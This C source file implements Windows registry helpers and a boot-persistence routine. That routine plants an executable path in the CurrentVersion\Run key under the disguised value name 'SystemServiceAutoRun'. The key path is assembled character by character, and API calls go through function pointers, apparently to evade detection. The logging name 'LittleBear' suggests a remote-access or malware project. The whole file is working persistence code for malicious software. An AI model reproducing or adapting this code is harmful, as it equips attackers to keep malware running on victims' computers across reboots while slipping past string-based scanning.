#include "PublicVar.h"
#include "BootAutoRun.h"
#include <lmcons.h>
#include <lmat.h>
#include <LMErr.h>
#include <windows.h>



DWORD QueryRegistryValue(HKEY hMainKey,char * szSubKey,char * szKeyName,unsigned char * szKeyValue,int *buflen,int iCpuBits)
{
	char szout[1024];

	DWORD dwType = KEY_READ | KEY_WRITE;

	PVOID dwWow64Value;
	if (iCpuBits == 64 && hMainKey == HKEY_LOCAL_MACHINE)
	{
		dwType |= KEY_WOW64_64KEY;
		pfnWow64DisableWow64FsRedirection(&dwWow64Value); 
	}

	HKEY hKey = 0;
	int iRes = 0;
	DWORD dwDisPos = 0;
	iRes = lpRegCreateKeyExA(hMainKey,szSubKey,0,REG_NONE,REG_OPTION_NON_VOLATILE,dwType,0,&hKey,&dwDisPos);
	if (iCpuBits == 64 && hMainKey == HKEY_LOCAL_MACHINE)
	{
		pfnWow64RevertWow64FsRedirection (&dwWow64Value);
	}

	if(iRes != ERROR_SUCCESS)
	{
		lpwsprintfA(szout, "__SetRegistryKeyValueDword lpRegCreateKeyExA error,subkey:%s,keyname:%s\r\n", szSubKey, szKeyName);
		WriteLittleBearLog(szout);
		return FALSE;
	}

	//if value is 234 ,it means out buffer is limit

	unsigned long subkeyType = REG_BINARY|REG_DWORD|REG_EXPAND_SZ|REG_MULTI_SZ|REG_NONE|REG_SZ; 
	iRes = lpRegQueryValueExA(hKey,szKeyName,0,&subkeyType,szKeyValue,(LPDWORD)buflen);
	lpRegCloseKey(hKey);
	if(iRes == ERROR_SUCCESS)
	{
		return TRUE;
	}

	return FALSE;
}



DWORD __SetRegistryKeyValueChar(HKEY hMainKey,char * szSubKey,char * szKeyName,char * szKeyValue,int iCpuBits)
{
	char szout[1024];

	DWORD dwDisPos = 0;
	HKEY hKey = 0;
	int iRes = 0;

	DWORD dwType = KEY_READ | KEY_WRITE;

	PVOID dwWow64Value;
	if (iCpuBits == 64 && hMainKey == HKEY_LOCAL_MACHINE)
	{
		dwType |= KEY_WOW64_64KEY;
		pfnWow64DisableWow64FsRedirection(&dwWow64Value); 
	}

	iRes = lpRegCreateKeyExA(hMainKey,szSubKey,0,REG_NONE,REG_OPTION_NON_VOLATILE,dwType,0,&hKey,&dwDisPos);
	if (iCpuBits == 64 && hMainKey == HKEY_LOCAL_MACHINE)
	{
		pfnWow64RevertWow64FsRedirection (&dwWow64Value);
	}

	if(iRes != ERROR_SUCCESS)
	{
		lpwsprintfA(szout, "__SetRegistryKeyValueChar lpRegCreateKeyExA error,subkey:%s,keyname:%s\r\n", szSubKey, szKeyName);
		WriteLittleBearLog(szout);
		return FALSE;
	}

	unsigned char szQueryValue[MAX_PATH]={0};
	unsigned long iQueryLen = MAX_PATH;
	unsigned long iType = REG_BINARY|REG_DWORD|REG_EXPAND_SZ|REG_MULTI_SZ|REG_NONE|REG_SZ; 
	//if value is 234 ,it means out buffer is limit
	iRes = lpRegQueryValueExA(hKey,szKeyName,0,&iType,szQueryValue,&iQueryLen);
	if(iRes == ERROR_SUCCESS)
	{
		if(strstr((char*)szQueryValue,szKeyValue) == 0)
		{
			iRes = lpRegSetValueExA(hKey,szKeyName,0,REG_SZ,(unsigned char*)szKeyValue,lplstrlenA(szKeyValue));
			if (iRes != ERROR_SUCCESS)
			{
				WriteLittleBearLog("__SetRegistryKeyValueChar lpRegSetValueExA error\r\n");
				lpRegCloseKey(hKey);
				return FALSE;
			}
			else
			{
				//RegFlushKey(hKey);
				WriteLittleBearLog("__SetRegistryKeyValueChar lpRegSetValueExA ok\r\n");
				lpRegCloseKey(hKey);
				return TRUE;
			}
		}
		else
		{
			WriteLittleBearLog("__SetRegistryKeyValueChar lpRegQueryValueExA the key has been existed\r\n");
		}

		lpRegCloseKey(hKey);
		return TRUE;
	}
	else
	{
		iRes = lpRtlGetLastWin32Error();		//2
		iRes = lpRegSetValueExA(hKey,szKeyName,0,REG_SZ,(unsigned char*)szKeyValue,lplstrlenA(szKeyValue));
		if (iRes != ERROR_SUCCESS)
		{
			WriteLittleBearLog("__SetRegistryKeyValueChar lpRegSetValueExA error\r\n");
			lpRegCloseKey(hKey);
			return FALSE;
		}
		else
		{
			//RegFlushKey(hKey);
			WriteLittleBearLog("__SetRegistryKeyValueChar lpRegSetValueExA ok\r\n");
			lpRegCloseKey(hKey);
			return TRUE;
		}
	}

	return FALSE;
}


DWORD __SetRegistryKeyValueDword(HKEY hMainKey, char * szSubKey, char * szKeyName, DWORD dwKeyValue, int iCpuBits)
{
	DWORD dwType = KEY_READ | KEY_WRITE;

	PVOID dwWow64Value;
	if (iCpuBits == 64 && hMainKey == HKEY_LOCAL_MACHINE)
	{
		dwType |= KEY_WOW64_64KEY;
		pfnWow64DisableWow64FsRedirection(&dwWow64Value);
	}

	HKEY hKey = 0;
	int iRes = 0;
	DWORD dwDisPos = 0;
	iRes = lpRegCreateKeyExA(hMainKey, szSubKey, 0, REG_NONE, REG_OPTION_NON_VOLATILE, dwType, 0, &hKey, &dwDisPos);
	if (iCpuBits == 64 && hMainKey == HKEY_LOCAL_MACHINE)
	{
		pfnWow64RevertWow64FsRedirection(&dwWow64Value);
	}

	if (iRes != ERROR_SUCCESS)
	{
		WriteLittleBearLog("__SetRegistryKeyValueDword lpRegCreateKeyExA error\r\n");
		return FALSE;
	}

	DWORD szQueryValue = 0;
	unsigned long iQueryLen = sizeof(DWORD);
	unsigned long iType = REG_BINARY | REG_DWORD | REG_EXPAND_SZ | REG_MULTI_SZ | REG_NONE | REG_SZ;
	//if value is 234 ,it means out buffer is limit
	iRes = lpRegQueryValueExA(hKey, szKeyName, 0, &iType, (LPBYTE)&szQueryValue, &iQueryLen);
	if (iRes == ERROR_SUCCESS)
	{
		if (szQueryValue == dwKeyValue)
		{
			WriteLittleBearLog("__SetRegistryKeyValueDword lpRegQueryValueExA the key has been existed\r\n");
			lpRegCloseKey(hKey);
			return TRUE;
		}
		else
		{
			iRes = lpRegSetValueExA(hKey, szKeyName, 0, REG_DWORD, &dwKeyValue, sizeof(dwKeyValue));
			if (iRes != ERROR_SUCCESS)
			{
				WriteLittleBearLog("__SetRegistryKeyValueDword lpRegSetValueExA error\r\n");
				lpRegCloseKey(hKey);
				return FALSE;
			}
			else
			{
				//RegFlushKey(hKey);
				WriteLittleBearLog("__SetRegistryKeyValueDword lpRegSetValueExA ok\r\n");
				lpRegCloseKey(hKey);
				return TRUE;
			}
		}
	}
	else
	{
		iRes = lpRtlGetLastWin32Error();
		iRes = lpRegSetValueExA(hKey, szKeyName, 0, REG_DWORD, &dwKeyValue, sizeof(dwKeyValue));
		if (iRes != ERROR_SUCCESS)
		{
			WriteLittleBearLog("__SetRegistryKeyValueDword lpRegSetValueExA error\r\n");
			lpRegCloseKey(hKey);
			return FALSE;
		}
		else
		{
			//RegFlushKey(hKey);
			WriteLittleBearLog("__SetRegistryKeyValueDword lpRegSetValueExA ok\r\n");
			lpRegCloseKey(hKey);
			return TRUE;
		}
	}

	return FALSE;
}


//need admin priority if to modify local_machine
int SetBootAutoRunInRegistryRun(HKEY hMainKey,char * strPEResidence,int iCpuBits)
{
	//'Software\Microsoft\Windows\CurrentVersion\RunServicesOnce',0
	//'Software\Microsoft\Windows\CurrentVersion\RunServices',0
	//'Software\Microsoft\Windows\CurrentVersion\RunOnce',0
	char szKeyAutoRun[] = {'S','o','f','t','w','a','r','e',0x5c,'M','i','c','r','o','s','o','f','t',0x5c,
		'W','i','n','d','o','w','s',0x5c,'C','u','r','r','e','n','t','V','e','r','s','i','o','n',0x5c,'R','u','n',0x5c,0};

	char szValueAutoRun[] = {'S','y','s','t','e','m','S','e','r','v','i','c','e','A','u','t','o','R','u','n',0};	

// 	char szKeyAutoRun64[] = {'S','o','f','t','w','a','r','e',0x5c,'W','o','w','6','4','3','2','N','o','d','e',
// 		0x5c,'M','i','c','r','o','s','o','f','t',0x5c,
// 		'W','i','n','d','o','w','s',0x5c,'C','u','r','r','e','n','t','V','e','r','s','i','o','n',0x5c,'R','u','n',0x5c,0};

	DWORD dwType = KEY_READ | KEY_WRITE;

	PVOID dwWow64Value;
	if (iCpuBits == 64 && hMainKey == HKEY_LOCAL_MACHINE)
	{
		dwType |= KEY_WOW64_64KEY;
		pfnWow64DisableWow64FsRedirection(&dwWow64Value);
	}

	DWORD dwDisPos = 0;
	HKEY hKey = 0;
	int iRes = 0;
	iRes = lpRegCreateKeyExA(hMainKey, szKeyAutoRun,0,REG_NONE,REG_OPTION_NON_VOLATILE,dwType,0,&hKey,&dwDisPos);
		
	if (iCpuBits == 64 && hMainKey == HKEY_LOCAL_MACHINE)
	{
		pfnWow64RevertWow64FsRedirection(&dwWow64Value);
	}

	if(iRes != ERROR_SUCCESS)
	{
		WriteLittleBearLog("SetBootAutoRunInRegistryRun lpRegCreateKeyExA 64 error\r\n");
		return FALSE;
	}

	unsigned char szQueryValue[MAX_PATH] = { 0 };
	unsigned long iQueryLen = MAX_PATH;
	unsigned long iType = REG_BINARY | REG_DWORD | REG_EXPAND_SZ | REG_MULTI_SZ | REG_NONE | REG_SZ;
	//if value is 234 ,it means out buffer is limit
	iRes = lpRegQueryValueExA(hKey,szValueAutoRun,0,&iType,szQueryValue,&iQueryLen);
	if(iRes == ERROR_SUCCESS && strstr((char*)szQueryValue,strPEResidence))
	{
		WriteLittleBearLog("SetBootAutoRunInRegistryRun lpRegQueryValueExA 64 the key has been existed\r\n");
		lpRegCloseKey(hKey);
		return TRUE;
	}
	else
	{
		iRes = lpRtlGetLastWin32Error();
		//2 is error

		iRes = lpRegSetValueExA(hKey,szValueAutoRun,0,REG_SZ,(unsigned char*)strPEResidence,lplstrlenA(strPEResidence));
		//RegFlushKey(hKey);
		lpRegCloseKey(hKey);
		if (iRes != ERROR_SUCCESS)
		{
			WriteLittleBearLog("SetBootAutoRunInRegistryRun lpRegSetValueExA 64 error\r\n");
			return FALSE;
		}
		else
		{
			WriteLittleBearLog("SetBootAutoRunInRegistryRun lpRegSetValueExA 64 ok\r\n");
			return TRUE;
		}
	}
	
	return FALSE;
}